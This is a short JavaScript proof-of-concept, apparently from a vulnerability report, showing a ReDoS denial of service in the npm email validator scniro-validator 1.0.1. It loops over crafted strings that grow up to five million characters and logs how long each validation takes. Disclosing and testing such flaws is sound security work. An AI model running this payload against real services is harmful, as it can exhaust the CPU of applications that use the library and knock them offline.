/**
 * scniro-validator@1.0.1
 * Package Manager: npm
 * Link to published package: https://github.com/scniro/scniro-validator
 * Link to GitHub repo: https://github.com/scniro/scniro-validator
 * Severity level: High
 * Module Description: a small, dependency-free email validator with configurable rules and suggested corrections
 * Additional Info: It allows cause a denial of service when validating crafted invalid emails.
 * Contacted maintainer?: No
 * Open issue?: No
 */


var v = require('scniro-validator');


function build_blank(n) {
    var ret = "a@"
    for (var i = 0; i < n; i++) {
        ret += "a"
    }
    return ret + "!";
}



for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = build_blank(i)
    var result = v.validate(attack_str);
    var time_cost = Date.now() - time;
    console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
}